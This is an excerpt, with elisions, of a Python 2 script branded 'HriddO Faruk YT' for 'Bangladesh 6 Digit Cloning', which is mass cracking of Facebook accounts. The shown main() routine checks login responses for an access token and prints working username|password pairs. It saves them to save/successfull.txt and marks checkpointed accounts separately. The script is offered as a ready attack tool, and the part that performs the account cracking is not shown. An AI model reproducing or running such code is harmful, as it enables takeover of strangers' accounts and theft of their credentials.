#.       HriddO  YT 
#.       https://github.com/HriddOfarukyt
...
print("\033[0;91mThis Tool's Make By :HriddO Faruk YT")

psb('\x1b[1;92mBangladesh 6 Digit Cloning Start please Wait__This tools maked  by It"s HriddO Faruk')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : It"s HriddO Faruk'
    print '\033[0;94mFACEBOOK : HriddO Faruk YT'
    print '\033[0;96mCreator : https://www.facebook.com/HriddO.farukyt.5'
    print '\033[0;96mpage: It`s HriddO Faruk & The dark hunter mafia'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HriddO-BD-CP\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;92m [HriddO-BD-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 HriddO-bd-6digt.py')
